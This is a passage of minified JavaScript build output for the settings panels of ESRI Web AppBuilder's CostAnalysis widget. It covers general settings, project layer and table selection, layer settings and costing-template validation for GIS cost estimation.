// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/CostAnalysis/setting/GeneralSettings":function(){define("dojo/_base/declare jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/text!./GeneralSettings.html dojo/_base/lang dojo/on dojo/dom-attr dojo/dom-class".split(" "),function(t,r,u,p,g,l,k,a){return t([r,u],{templateString:p,baseClass:"jimu-widget-cost-analysis-general-settings",constructor:function(a){g.mixin(this,a)},postMixInProperties:function(){this.nls.common={};g.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this.inherited(arguments);
this._init()},_init:function(){this._setConfig();this._attachNodeEvents();this.currencyInputNode.validator=g.hitch(this,this._currencyValidator);this.bufferDistanceInputNode.validator=g.hitch(this,this._bufferDistanceValidator)},_setConfig:function(){this.measurementUnitInputNode.set("value",this.config.generalSettings.measurementUnit);this.currencyInputNode.set("value",this.config.generalSettings.currency);this.roundCostInputNode.set("value",this.config.generalSettings.roundCostType);this.projectAreaTypeInputNode.set("value",
this.config.generalSettings.projectAreaType);this.bufferDistanceInputNode.set("value",this.config.generalSettings.bufferDistance)},validate:function(){var a;a=this.projectAreaTypeInputNode.get("value");return this.currencyInputNode.validate()?"buffer"!==a||this.bufferDistanceInputNode.validate()?{isValid:!0}:{isValid:!1,errorMessage:this.nls.generalSettings.errorMessages.bufferDistance}:{isValid:!1,errorMessage:this.nls.generalSettings.errorMessages.currency}},getConfig:function(){return{measurementUnit:this.measurementUnitInputNode.get("value"),
currency:this.currencyInputNode.get("value"),roundCostType:this.roundCostInputNode.get("value"),projectAreaType:this.projectAreaTypeInputNode.get("value"),bufferDistance:this.bufferDistanceInputNode.get("value")}},_attachNodeEvents:function(){this.own(l(this.measurementUnitInputNode,"change",g.hitch(this,function(a){k.set(this.bufferDistanceUnit,"innerHTML",this.nls.units[a].label)})));this.own(l(this.projectAreaTypeInputNode,"change",g.hitch(this,function(d){"outline"===d?(this.bufferDistanceInputNode.textbox.value=
"5",this.bufferDistanceInputNode.set("disabled",!0),a.add(this.projectSettingsOutputRightContainerNode,"esriCTHidden")):(this.bufferDistanceInputNode.set("disabled",!1),a.remove(this.projectSettingsOutputRightContainerNode,"esriCTHidden"))})))},_currencyValidator:function(a){return a.match(/^([^0-9]+)$/)?!0:(this.currencyInputNode.invalidMessage=this.nls.generalSettings.errorMessages.currency,!1)},_bufferDistanceValidator:function(a){return 0>a||100<a?(this.bufferDistanceInputNode.invalidMessage=
this.nls.generalSettings.errorMessages.outOfRangebufferDistance,!1):a.match(/^([0-9]*[1-9][0-9]*(\.[0-9]+)?|[0]+\.[0-9]*[1-9][0-9]*)$/)?!0:(this.bufferDistanceInputNode.invalidMessage=this.nls.generalSettings.errorMessages.bufferDistance,!1)}})})},"widgets/CostAnalysis/setting/ProjectSettings":function(){define("dojo/_base/declare jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/text!./ProjectSettings.html dojo/_base/lang dojo/on dojo/_base/array dojo/Evented dojo/string esri/layers/FeatureLayer dojo/promise/all dojo/Deferred jimu/dijit/CheckBox".split(" "),
function(t,r,u,p,g,l,k,a,d,b,q,m){return t([r,u,a],{baseClass:"jimu-widget-cost-analysis-project-settings",templateString:p,_configuredFieldsTable:null,_prevCostingGeometryLayerValue:"",_prevProjectLayerValue:"",_prevProjectAssetsTableValue:"",_prevProjectMultiplierTableValue:"",_defaultSelectOption:{},_assetsTableRequiredFields:{},_multiplierTableRequiredFields:{},constructor:function(f){g.mixin(this,f)},postMixInProperties:function(){this.nls.common={};g.mixin(this.nls.common,window.jimuNls.common)},
postCreate:function(){this._configuredFieldsTable=null;this._prevProjectMultiplierTableValue=this._prevProjectAssetsTableValue=this._prevProjectLayerValue=this._prevCostingGeometryLayerValue="";this.own(l(this.costingGeometryHelp,"click",g.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.costingGeometryHelp)})));this.own(l(this.fieldToLabelGeographyHelp,"click",g.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.fieldToLabelGeographyHelp)})));this.own(l(this.projectAssetsTableHelp,
"click",g.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.projectAssetsTableHelp)})));this.own(l(this.projectMultiplierTableHelp,"click",g.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.projectMultiplierTableHelp)})));this.own(l(this.projectLayerHelp,"click",g.hitch(this,function(){this.appUtils.showMessage(this.nls.projectSettings.projectLayerHelp)})));this._assetsTableRequiredFields={ASSETGUID:["esriFieldTypeGUID"],COSTEQUATION:["esriFieldTypeString"],
SCENARIO:["esriFieldTypeString"],TEMPLATENAME:["esriFieldTypeString"],GEOGRAPHYGUID:["esriFieldTypeGUID"],PROJECTGUID:["esriFieldTypeGUID"]};this._multiplierTableRequiredFields={DESCRIPTION:["esriFieldTypeString"],TYPE:["esriFieldTypeString"],VALUE:["esriFieldTypeDouble","esriFieldTypeSingle"],COSTINDEX:["esriFieldTypeSmallInteger","esriFieldTypeInteger"],PROJECTGUID:["esriFieldTypeGUID"]};this._defaultSelectOption={value:"",label:this.nls.projectSettings.selectLabel};this.inherited(arguments);this._init()},
getConfig:function(){return{costingGeometryLayer:this._prevCostingGeometryLayerValue,geographyField:this.fieldToLabelGeography.value,assetTable:this._prevProjectAssetsTableValue,multiplierAdditionalCostTable:this._prevProjectMultiplierTableValue,projectLayer:this._prevProjectLayerValue}},validate:function(){var f,a;f=!0;a="";""===this._prevProjectAssetsTableValue&&""===this._prevProjectMultiplierTableValue&&""===this._prevProjectLayerValue||""!==this._prevProjectAssetsTableValue&&""!==this._prevProjectMultiplierTableValue&&
""!==this._prevProjectLayerValue||(a=[],""===this._prevProjectAssetsTableValue&&a.push(this.nls.projectSettings.projectAssetsTableLabel),""===this._prevProjectMultiplierTableValue&&a.push(this.nls.projectSettings.projectMultiplierTableLabel),""===this._prevProjectLayerValue&&a.push(this.nls.projectSettings.projectLayerLabel),a=a.join(" and "),f=!1,a=d.substitute(this.nls.projectSettings.errorMessages.invalidConfiguration,{fieldsString:g.trim(a)}));return{isValid:f,errorMessage:a}},_init:function(){var f,
a,d;f=[];a=[];d=[];this.map&&this.map.itemInfo&&this.map.itemInfo.itemData&&(this.map.itemInfo.itemData.operationalLayers&&0<this.map.itemInfo.itemData.operationalLayers.length&&(f=this.map.itemInfo.itemData.operationalLayers),this.map.itemInfo.itemData.tables&&0<this.map.itemInfo.itemData.tables.length&&(a=this.map.itemInfo.itemData.tables));this._filterValidLayersForDropDown(f);k.forEach(a,g.hitch(this,function(f){var h=new m;d.push(h);f=new b(f.url);l(f,"load",g.hitch(this,function(c){k.forEach(this.map.itemInfo.itemData.tables,
g.hitch(this,function(e){if(e.url===c.layer.url)return c.layer.id=e.id,c.layer.title=e.title,!0}));h.resolve(c.layer)}))}));q(d).then(g.hitch(this,function(f){this._populateTablesForDropDown(f)}));l(this.fieldToLabelGeography,"change",g.hitch(this,function(f){this.emit("onGeographyFieldChange",f,this.costingGeometryLayerDropDown.getValue())}));this._attachingEvents();this._setConfig()},_filterValidLayersForDropDown:function(f){var a,b;a=[this._defaultSelectOption];b=[this._defaultSelectOption];this._costingGeometryLayerFieldOptions=
{defaultSelectOption:{options:[this._defaultSelectOption]}};f=f&&0<f.length?this._getLayerOptions(f,a,b):{costingGeometryLayerOptions:a,projectLayerOptions:b};this.costingGeometryLayerDropDown.set("options",g.clone(f.costingGeometryLayerOptions));this.projectLayerDropDown.set("options",g.clone(f.projectLayerOptions))},_getLayerOptions:function(f,a,b){var d;k.forEach(f,g.hitch(this,function(h){if(h.layerObject&&h.layerObject.capabilities)d=h.layerObject.capabilities;else return!0;"esriGeometryPolygon"===
h.layerObject.geometryType&&-1<d.indexOf("Query")&&this._hasGlobalIDField(h)&&(a.push({value:h.id,label:h.title}),"ArcGISFeatureLayer"===h.layerType&&(-1<d.indexOf("Editing")||-1<d.indexOf("Update"))&&-1<d.indexOf("Create")&&-1<d.indexOf("Delete")&&this._isValidProjectLayer(h)&&b.push({value:h.id,label:h.title}))}));return{costingGeometryLayerOptions:a,projectLayerOptions:b}},_isValidProjectLayer:function(f){var a,b,d,h,c;h=["esriFieldTypeDouble","esriFieldTypeSingle"];f=f.layerObject.fields;d=[];
for(a in f)c=f[a].type,b=f[a].name.toUpperCase(),("PROJECTNAME"===b&&"esriFieldTypeString"===c||"DESCRIPTION"===b&&"esriFieldTypeString"===c||"TOTALASSETCOST"===b&&-1<h.indexOf(c)||"GROSSPROJECTCOST"===b&&-1<h.indexOf(c)||"esriFieldTypeGlobalID"===c)&&d.push(b);return 5===d.length?!0:!1},_hasGlobalIDField:function(a){var f;f=!1;(a=a.layerObject.fields||a.fields)&&0<a.length&&k.some(a,g.hitch(this,function(a){if("esriFieldTypeGlobalID"===a.type)return f=!0}));return f},_populateTablesForDropDown:function(a){var f,
b;f=[this._defaultSelectOption];b=[this._defaultSelectOption];a&&0<a.length&&k.forEach(a,g.hitch(this,function(a){this._isValidTable(a,"projectAssets")&&f.push({value:a.id||a.name,label:a.title||a.name});this._isValidTable(a,"projectMultiplier")&&b.push({value:a.id||a.name,label:a.title||a.name})}));this.projectAssetsTable.addOption(g.clone(f));this.projectMultiplierTable.addOption(g.clone(b));this._setSelectedValuesInTables()},_isValidTable:function(a,b){var f,d,h=[];f=!1;(a=a.fields)&&0<a.length&&
k.some(a,g.hitch(this,function(c){d=c.name.toUpperCase();if("projectAssets"===b&&this._assetsTableRequiredFields[d]&&-1<this._assetsTableRequiredFields[d].indexOf(c.type)&&!c.domain){if(h.push(c.name),h.length===Object.keys(this._assetsTableRequiredFields).length)return f=!0}else if("projectMultiplier"===b&&this._multiplierTableRequiredFields[d]&&-1<this._multiplierTableRequiredFields[d].indexOf(c.type)&&!c.domain&&(h.push(c.name),h.length===Object.keys(this._multiplierTableRequiredFields).length))return f=
!0}));return f},_setSelectedValuesInTables:function(){var a;this.config.assetTable?(a=this.layerInfosObj.getTableInfoById(this.config.assetTable))&&a.layerObject?(this.projectAssetsTable.set("value",this.config.assetTable),this._prevProjectAssetsTableValue=this.config.assetTable):(this.projectAssetsTable.set("value",""),this._prevProjectAssetsTableValue=""):(this.projectAssetsTable.set("value",""),this._prevProjectAssetsTableValue="");this.config.multiplierAdditionalCostTable?(a=this.layerInfosObj.getTableInfoById(this.config.multiplierAdditionalCostTable))&&
a.layerObject?(this.projectMultiplierTable.set("value",this.config.multiplierAdditionalCostTable),this._prevProjectMultiplierTableValue=this.config.multiplierAdditionalCostTable):(this.projectMultiplierTable.set("value",""),this._prevProjectMultiplierTableValue=""):(this.projectMultiplierTable.set("value",""),this._prevProjectMultiplierTableValue="")},_setConfig:function(){var a;this.config.costingGeometryLayer&&this.layerInfosObj.getLayerInfoById(this.config.costingGeometryLayer)&&(a=this.layerInfosObj.getLayerInfoById(this.config.costingGeometryLayer).layerObject);
a?(this.costingGeometryLayerDropDown.set("value",this.config.costingGeometryLayer),this._prevCostingGeometryLayerValue=this.config.costingGeometryLayer,this._createCostingGeometryLayerFieldOptions(a,this._costingGeometryLayerFieldOptions),this.fieldToLabelGeography.options=[],this.fieldToLabelGeography.options.length=0,this.config.geographyField?(this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions[this.config.costingGeometryLayer].options),this.fieldToLabelGeography.set("disabled",
!1)):(this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions.defaultSelectOption.options),this.fieldToLabelGeography.set("disabled",!0))):(this.costingGeometryLayerDropDown.set("value",""),this._prevCostingGeometryLayerValue="",this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions.defaultSelectOption.options),this.fieldToLabelGeography.set("disabled",!0),this.fieldToLabelGeography.set("value",""));this.config.projectLayer?(this.projectLayerDropDown.set("value",
this.config.projectLayer),this._prevProjectLayerValue=this.config.projectLayer):(this.projectLayerDropDown.set("value",""),this._prevProjectLayerValue="")},_attachingEvents:function(){this.own(l(this.costingGeometryLayerDropDown,"change",g.hitch(this,function(a){a!==this.costingGeometryLayerDropDown.value&&this.costingGeometryLayerDropDown.set("value",a);""===a||this._costingGeometryLayerFieldOptions[a]||(a=this.layerInfosObj.getLayerInfoById(a).layerObject,this._createCostingGeometryLayerFieldOptions(a,
this._costingGeometryLayerFieldOptions));this._onDropdownChange(this.costingGeometryLayerDropDown,"costingGeometryLayer","layer")})));this.own(l(this.projectLayerDropDown,"change",g.hitch(this,function(){this._onDropdownChange(this.projectLayerDropDown,"projectLayer","layer")})));this.own(l(this.projectAssetsTable,"change",g.hitch(this,function(){this._onDropdownChange(this.projectAssetsTable,"projectAssets","table")})));this.own(l(this.projectMultiplierTable,"change",g.hitch(this,function(){this._onDropdownChange(this.projectMultiplierTable,
"projectMultiplier","table")})))},_onDropdownChange:function(a,b,d){("layer"===d?this._validateDuplicateSelection(a,this.projectLayerDropDown,this.costingGeometryLayerDropDown):this._validateDuplicateSelection(a,this.projectAssetsTable,this.projectMultiplierTable))?this._setNewDropdownValue(a,b):this._restorePreviousDropdownValue(a,b)},_validateDuplicateSelection:function(a,b,l){return a.value&&b.value===l.value?(a=d.substitute(this.nls.projectSettings.errorMessages.duplicateLayerSelection,{layerName:g.trim(a.tableNode.innerText)}),
this.emit("onDuplicateLayerSelect",a),!1):!0},_setNewDropdownValue:function(a,b){switch(b){case "costingGeometryLayer":this._onCostingGeometryLayerDropDownChange();this._prevCostingGeometryLayerValue!==a.value&&(this.emit("onLayerSelected",{lastSelectedId:this._prevCostingGeometryLayerValue,currentSelectedLayerId:a.value}),this.emit("onGeographyFieldChange",this.fieldToLabelGeography.get("value"),this.costingGeometryLayerDropDown.get("value")),this._prevCostingGeometryLayerValue=a.value);break;case "projectLayer":this._onProjectLayerDropDownChange();
this._prevProjectLayerValue!==a.value&&(this.emit("onLayerSelected",{lastSelectedId:this._prevProjectLayerValue,currentSelectedLayerId:a.value}),this._prevProjectLayerValue=a.value);break;case "projectAssets":this._prevProjectAssetsTableValue=a.value;break;case "projectMultiplier":this._prevProjectMultiplierTableValue=a.value}},_restorePreviousDropdownValue:function(a,b){switch(b){case "costingGeometryLayer":a.set("value",this._prevCostingGeometryLayerValue);break;case "projectLayer":a.set("value",
this._prevProjectLayerValue);break;case "projectAssets":a.set("value",this._prevProjectAssetsTableValue);break;case "projectMultiplier":a.set("value",this._prevProjectMultiplierTableValue)}},_createCostingGeometryLayerFieldOptions:function(a,b){var d;d=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble","esriFieldTypeString"];a&&a.fields&&0<a.fields.length?(b[a.id]||(b[a.id]={},b[a.id].options=[]),k.forEach(a.fields,g.hitch(this,function(f){-1<d.indexOf(f.type)&&
b[a.id].options.push({value:f.name,label:f.alias?f.alias:f.name})}))):b[a.id].options.push([this._defaultSelectOption])},_onCostingGeometryLayerDropDownChange:function(){var a;this.fieldToLabelGeography.options=[];this.fieldToLabelGeography.options.length=0;a=this.costingGeometryLayerDropDown.value;""!==a?(this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions[a].options),this.fieldToLabelGeography.set("disabled",!1)):(this.fieldToLabelGeography.set("options",this._costingGeometryLayerFieldOptions.defaultSelectOption.options),
this.fieldToLabelGeography.set("disabled",!0));this.config.geographyField?this.fieldToLabelGeography.set("value",this.config.geographyField,!1):this.fieldToLabelGeography.set("value","",!1)},_onProjectLayerDropDownChange:function(){var a,b;a={idFieldOptions:[this._defaultSelectOption],stringFieldOptions:[this._defaultSelectOption],costFieldOptions:[this._defaultSelectOption]};this.projectLayerDropDown.value&&(b=this.layerInfosObj.getLayerInfoById(this.projectLayerDropDown.value).layerObject,a=this._getTableDropdownOptions(b.fields,
a))},_getTableDropdownOptions:function(a,b){var d,f,h;d=["esriFieldTypeOID","esriFieldTypeGlobalID"];f=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"];k.forEach(a,g.hitch(this,function(c){h={value:c.name,label:c.alias?c.alias:c.name};-1<d.indexOf(c.type)?b.idFieldOptions.push(h):-1<f.indexOf(c.type)?b.costFieldOptions.push(h):"esriFieldTypeString"===c.type&&b.stringFieldOptions.push(h)}));return b}})})},"widgets/CostAnalysis/setting/LayerSettings":function(){define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./LayerSettings.html dojo/_base/lang jimu/dijit/SimpleTable dojo/_base/array dojo/query dijit/registry dojo/dom-class dijit/form/Select dojo/dom-construct dojo/_base/html dojo/on dojo/dom-attr".split(" "),
function(t,r,u,p,g,l,k,a,d,b,q,m,f,n,v,w){return t([r,u,p],{templateString:g,baseClass:"jimu-widget-cost-analysis-layer-settings",_layerSettingsTable:null,constructor:function(a){l.mixin(this,a)},postMixInProperties:function(){this.nls.common={};l.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this.inherited(arguments);this._layerSettingsTable=null},setConfig:function(){this._filterLayers()},getConfig:function(){return this._getUpdateLayerSettings()},_getUpdateLayerSettings:function(){var a;
if(this._layerSettingsTable)return a=this._layerSettingsTable.getData(),a=this._getSelectedFields(a)},_createlayerSettingsGrid:function(){this._layerSettingsTable=new k({fields:[{name:"title",title:this.nls.layerSettings.layerNameHeaderTitle,type:"text",editable:!1,width:"44%"},{name:"fieldPicker",title:this.nls.layerSettings.fieldPickerHeaderTitle,type:"empty",editable:!1,width:"40%"},{name:"editable",title:this.nls.layerSettings.EditableLayerHeaderTitle,type:"checkbox",editable:!1,width:"16%"},
{name:"selectable",title:this.nls.layerSettings.SelectableLayerHeaderTitle,type:"checkbox",editable:!1,hidden:!0,width:"16%"},{name:"id",title:"id",type:"text",editable:!1,hidden:!0,width:"0%"},{name:"url",title:"url",type:"text",editable:!1,hidden:!0,width:"0%"}],selectable:!0});this._layerSettingsTable.placeAt(this.layerSettingsTableNode);n.setStyle(this._layerSettingsTable.domNode,{height:"100%"});this._layerSettingsTable.startup()},onLayerSettingChange:function(a){var c={};if(a=this._layerSettingsTable.getRowData(a))c.layerId=
a.id,c.editable=null===a.editable?!1:a.editable;this.emit("onLayerSettingUpdate",c)},_filterLayers:function(){var h,c,e=[];h=this.map.itemInfo.itemData.operationalLayers;0===h.length?q.remove(this.noAssetLayersAvailable,"esriCTHidden"):(q.add(this.noAssetLayersAvailable,"esriCTDisabled"),this._createlayerSettingsGrid(),this._setTableHeadTooltip(),e=[this.config.projectSettings.costingGeometryLayer||"",this.config.projectSettings.projectLayer||""],this.config&&0<this.config.layerSettings.length&&a.forEach(this.config.layerSettings,
l.hitch(this,function(a){if(c=this.map.getLayer(a.id))e.push(a.id),c.editable=this._checkEditCapabilities(c),this._createFieldsRows(a,c.editable)})),a.forEach(h,l.hitch(this,function(a){"ArcGISFeatureLayer"===a.layerType&&-1===e.indexOf(a.id)&&(a.selectable=!0,a.editable=this._checkEditCapabilities(a.layerObject),this._createFieldsRows(a,a.editable))})))},_checkEditCapabilities:function(a){return a.capabilities&&-1!==a.capabilities.indexOf("Delete")&&-1!==a.capabilities.indexOf("Create")&&-1!==a.capabilities.indexOf("Update")&&
a.globalIdField?!0:!1},_enableDisableEditableCheckbox:function(a,c){var e,h;e=d(".simple-table-cell ",a)[2];e.children[0]&&(h=b.byNode(e.children[0]));c?(q.remove(h.domNode,"jimu-state-disabled"),h.set("status",!0),a.selectFields&&a.selectFields.set("disabled",!1)):(q.add(h.domNode,"jimu-state-disabled"),w.set(h.domNode,"title",this.nls.layerSettings.disableEditableCheckboxTooltip),h.set("status",!1),a.selectFields&&a.selectFields.set("disabled",!0))},_createFieldsRows:function(a,c){var e,h,f;a.editable&&
(a.selectable=a.editable);e=this._layerSettingsTable.addRow({title:a.title?a.title:a.name,editable:a.editable,selectable:a.selectable,id:a.id,url:a.url});h=d(".jimu-checkbox",e.tr.children[2]);f=d(".jimu-checkbox",e.tr.children[3]);a.editable&&this._setCheckBoxState(h[0],f[0]);setTimeout(l.hitch(this,function(){this._setHeaderCheckBoxState()}),200);this.own(v(b.byNode(h[0]),"change",l.hitch(this,function(){this._setCheckBoxState(h[0],f[0]);this._setHeaderCheckBoxState();this.onLayerSettingChange(h[0].parentElement.parentElement)})));
this._addFieldsDropDown(e.tr,a);this._enableDisableEditableCheckbox(e.tr,c)},_setCheckBoxState:function(a,c){a=b.byNode(a);c=b.byNode(c);a.checked?(c.set("checked",!0),c.set("status",!1),c.set("disable",!0),q.add(c.domNode,"jimu-state-disabled")):(c.set("checked",!0),c.set("status",!0),c.set("disable",!1),q.remove(c.domNode,"jimu-state-disabled"));q.add(c.domNode.children[0],"checked")},_setHeaderCheckBoxState:function(){var h,c,e=!0,x;h=d(".simple-table-title .checkbox",this.domNode)[1];x=d(".simple-table-title .jimu-checkbox",
this.domNode)[1];a.some(this._layerSettingsTable.getRows(),l.hitch(this,function(a){c=d("td.selectable .checked",a);if(0===c.length)return e=!1,!0}));e?(q.add(h,"checked"),b.byNode(x).set("checked",!0)):(q.remove(h,"checked"),b.byNode(x).set("checked",!1))},updateLayerSettingsTable:function(h){var c=this._layerSettingsTable.getData(),e;h.lastSelectedId&&(e=this.layerInfosObj.getLayerInfoById(h.lastSelectedId).layerObject,e.editable=this._checkEditCapabilities(e),e.selectable=!0,this._createFieldsRows(e,
e.editable));h.currentSelectedLayerId&&a.some(c,l.hitch(this,function(a,c){if(a.id===h.currentSelectedLayerId)return this._layerSettingsTable.deleteRow(this._layerSettingsTable.tbody.rows[c]),!0}))},_addFieldsDropDown:function(a,c){var e,h;h=c.layerObject?c.layerObject:this.map._layers[c.id];if(e=d(".simple-table-cell",a)[1])e=f.create("div",{"class":"esriCTDropDownContainer"},e),a.selectFields=new m({options:this._getFieldsOptionsObj(h),"class":"esriCTLayerSettingsFieldsDropdown"}),a.selectFields.placeAt(e),
a.selectFields.startup(),c.selectedField&&a.selectFields.set("value",c.selectedField)},_getFieldsOptionsObj:function(h){var c=[],e,b;b=h.fields;e=["esriFieldTypeString"];c.push({label:this.nls.layerSettings.selectLabel,value:""});a.forEach(b,l.hitch(this,function(a){a.editable&&!a.domain&&-1<e.indexOf(a.type)&&37<a.length&&a.name!==h.typeIdField&&c.push({label:a.alias||a.name,value:a.name})}));return c},_getSelectedFields:function(h){var c;c=this._layerSettingsTable.getRows();a.forEach(c,l.hitch(this,
function(a,c){a.selectFields&&(h[c].selectedField=a.selectFields.getValue(),null===h[c].editable&&(h[c].editable=!1),delete h[c].fieldPicker)}));return h},_setTableHeadTooltip:function(){var a;a=d(".simple-table-thead th",this.domNode);a.length&&(w.set(a[0],"title",this.nls.layerSettings.layerNameHeaderTooltip),w.set(a[1],"title",this.nls.layerSettings.fieldPickerHeaderTooltip),w.set(a[2],"title",this.nls.layerSettings.EditableLayerHeaderTooltip),w.set(a[3],"title",this.nls.layerSettings.SelectableLayerHeaderTooltip))}})})},
"widgets/CostAnalysis/setting/CostingInfo":function(){define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./CostingInfo.html dojo/on dojo/dom-construct dojo/_base/lang dojo/_base/array ./ManageScenarios ./CostingTemplate esri/tasks/query esri/tasks/QueryTask dojo/Deferred dojo/string dojo/dom-class".split(" "),function(t,r,u,p,g,l,k,a,d,b,q,m,f,n,v,w){return t([r,u,p],{templateString:g,_manageScenario:null,totalScenariosCollection:[],costingTemplate:{},
_scenarioOptions:[],_geographyOptions:[],costingInfoData:{},baseClass:"jimu-widget-cost-analysis-costing-info",constructor:function(b){a.mixin(this,b)},postMixInProperties:function(){this.nls.common={};a.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this.costingTemplate={};this._manageScenario=null;this.totalScenariosCollection=[];this._scenarioOptions=[];this._geographyOptions=[];this.costingInfoData={};this.inherited(arguments);this._init();this.own(l(this.btnManageScenarios,
"click",a.hitch(this,this._manageScenariosBtnClicked)))},validate:function(){var a=this._validateCostingInfoTabData();return a.isValid?{isValid:!0}:{isValid:!1,errorMessage:a.errorMessage}},getConfig:function(){return{costingInfoData:this.costingInfoData,scenarios:this.totalScenariosCollection}},_init:function(){this._geographyOptions=[{label:this.nls.costingInfo.noneValue,value:""}];this.config.projectSettings&&""!==this.config.projectSettings.costingGeometryLayer&&void 0!==this.config.projectSettings.costingGeometryLayer?
this.getGeographyOptions().then(a.hitch(this,function(){this._createCostingTemplate()})):this._createCostingTemplate()},_createCostingTemplate:function(){var b,c,e=[],e=[this.config.projectSettings.costingGeometryLayer||"",this.config.projectSettings.projectLayer||""];this._getScenarioOptions(this.config.scenarios);b=this.map.itemInfo.itemData.operationalLayers;this._showHideNoLayerMessage(b.length);if(0<Object.keys(this.config.costingInfoSettings).length)for(c in this.config.costingInfoSettings){var x=
this._getOperationalLayer(b,c);x&&(e.push(c),this._createCostingTemplateObj(x))}d.forEach(b,a.hitch(this,function(a){this._checkEditCapabilities(a.layerObject)&&-1===e.indexOf(a.id)&&(a.layerObject.templates.length?this._createCostingTemplateObj(a):a.layerObject.types.length&&this._createCostingTemplateObj(a))}))},_createCostingTemplateObj:function(a){this.costingTemplate[a.id]=new q({nls:this.nls,map:this.map,config:this.config,layer:a,scenarios:this._scenarioOptions,geographies:this._geographyOptions},
k.create("div",{},this.costingTemplateContainer))},_getOperationalLayer:function(b,c){var e;d.some(b,a.hitch(this,function(a){if(a.id===c)return e=a,!0}));return e},_manageScenariosBtnClicked:function(){this._manageScenario=new b({nls:this.nls,map:this.map,config:this.config,existingScenarios:this.totalScenariosCollection});l(this._manageScenario,"okButtonClicked",a.hitch(this,function(a){this._manageScenario.destroy();this._getScenarioOptions(a)}))},_checkEditCapabilities:function(a){return a.capabilities&&
-1!==a.capabilities.indexOf("Delete")&&-1!==a.capabilities.indexOf("Create")&&-1!==a.capabilities.indexOf("Update")&&a.globalIdField?!0:!1},_getScenarioOptions:function(b){var c,e;this._scenarioOptions=[{label:this.nls.costingInfo.noneValue,value:""}];this.totalScenariosCollection=[];d.forEach(b,a.hitch(this,function(a){c="object"===typeof a?a.field:a;this._scenarioOptions.push({label:c,value:c});this.totalScenariosCollection.push(c)}));for(e in this.costingTemplate)this.costingTemplate[e].updateScenarioOptions(this._scenarioOptions)},
getGeographyOptions:function(b,c){var e,d;e=new n;c||(b=this.config.projectSettings.geographyField,c=this.config.projectSettings.costingGeometryLayer);""!==c&&this.layerInfosObj.getLayerInfoById(c)?(c=this.map._layers[c],c=new f(c.url),d=new m,d.outFields=[b],d.returnDistinctValues=!0,d.returnGeometry=!1,d.where="1\x3d1",c.execute(d,a.hitch(this,function(a){this._geographyQueryTaskComplete(a,b);e.resolve(this._geographyOptions)}),a.hitch(this,function(){this._geographyOptions=[];this._geographyOptions.push({label:this.nls.costingInfo.noneValue,
value:""});e.resolve(this._geographyOptions)}))):(this._geographyOptions=[],this._geographyOptions.push({label:this.nls.costingInfo.noneValue,value:""}),e.resolve(this._geographyOptions));return e.promise},_geographyQueryTaskComplete:function(b,c){this._geographyOptions=[{label:this.nls.costingInfo.noneValue,value:""}];d.forEach(b.features,a.hitch(this,function(a){""!==a.attributes[c]&&null!==a.attributes[c]&&this._geographyOptions.push({label:isNaN(a.attributes[c])?a.attributes[c]:a.attributes[c].toString(),
value:a.attributes[c]})}))},_validateCostingInfoTabData:function(){var a,c,e,b,d,y,f;this.costingInfoData={};for(a in this.costingTemplate)if(y=[],f=[],this.costingTemplate[a]){this.costingInfoData[a]=this.costingTemplate[a].getUpdatedCostingInfo();b=this.costingInfoData[a].length;for(c in this.costingInfoData[a]){d=this.costingInfoData[a][c];-1===f.indexOf(d.featureTemplate)&&f.push(d.featureTemplate);""===d.scenario&&""===d.geography&&-1===y.indexOf(d.featureTemplate)&&y.push(d.featureTemplate);
if(!this.costingTemplate[a].validateCostEquation(d.costEquation))return{isValid:!1,errorMessage:v.substitute(this.nls.costingInfo.requiredCostEquation,{templateName:d.featureTemplate,layerName:this.costingTemplate[a].layer.title})};if(1<b)for(e=parseInt(c,0)+1;e<b;e++){var g;g=this.costingInfoData[a][e];if(d.featureTemplate===g.featureTemplate&&d.scenario===g.scenario&&d.geography===g.geography)return{isValid:!1,errorMessage:v.substitute(this.nls.costingInfo.duplicateTemplateMessage,{layerName:this.costingTemplate[a].layer.title,
templateName:d.featureTemplate})}}}b=0;d=f.length;for(b;b<d;b++)if(-1===y.indexOf(f[b]))return{isValid:!1,errorMessage:v.substitute(this.nls.costingInfo.defaultEquationRequired,{templateName:f[b],layerName:this.costingTemplate[a].layer.title})};if(0===this.costingInfoData[a].length)return{isValid:!1,errorMessage:v.substitute(this.nls.costingInfo.noTemplateAvailable,{layerName:this.costingTemplate[a].layer.title})}}return Object.keys(this.costingInfoData).length?{isValid:!0}:{isValid:!1,errorMessage:v.substitute(this.nls.costingInfo.noLayerMessage,
{tabName:this.nls.costingInfo.tabTitle})}},_updateCostingInfoTable:function(a){var c,e;a.layerId?c=a.layerId:(e=a.lastSelectedId,c=a.currentSelectedLayerId);Object.keys(a).length&&(e?(this.costingTemplate[c]&&this._deleteCostingInfoLayer(c),e&&this._addCostingInfoLayer(e)):a.editable?this._addCostingInfoLayer(c):this.costingTemplate[c]&&this._deleteCostingInfoLayer(c));this._showHideNoLayerMessage(Object.keys(this.costingTemplate).length)},_showHideNoLayerMessage:function(a){0===a?w.remove(this.noEditableLayersAvailable,
